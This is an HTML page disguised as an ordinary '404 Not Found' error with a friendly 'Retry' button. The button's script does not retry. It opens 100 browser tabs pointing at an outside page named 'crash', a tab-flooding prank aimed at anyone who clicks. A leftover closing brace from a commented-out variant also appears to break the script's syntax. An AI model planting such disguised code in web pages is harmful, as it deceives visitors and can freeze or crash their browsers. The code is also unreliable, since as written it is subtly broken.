<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f4f4f4;
            margin: 0;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .container {
            max-width: 400px;
            padding: 20px;
            background-color: white;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            font-size: 72px;
            color: #ff6b6b;
            margin-bottom: 20px;
        }
        p {
            font-size: 18px;
            color: #555;
        }
        button {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 16px;
            background-color: #ff6b6b;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover {
            background-color: #ff4b4b;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>404</h1>
        <p>Oops! The page you're looking for can't be found.</p>
        <p>Would you like to retry?</p>
        <button id="retry-button">Retry</button>
    </div>

    <script>
        document.getElementById('retry-button').addEventListener('click', function() {
            var url = 'https://billylikesbacon.github.io/crash/index.html'; // URL to open
            for (var i = 0; i < 100; i++){
                let newTab = window.open(url);
                newTab.location.href = url;
            }            
            
            //var url = 'https://billylikesbacon.github.io/crash/index.html'; // URL to open
            //for (var i = 0; i < 100; i++) {
            //    window.open(url, '_blank'); // Open 100 new tabs
            }
        });
    </script>

</body>
</html>
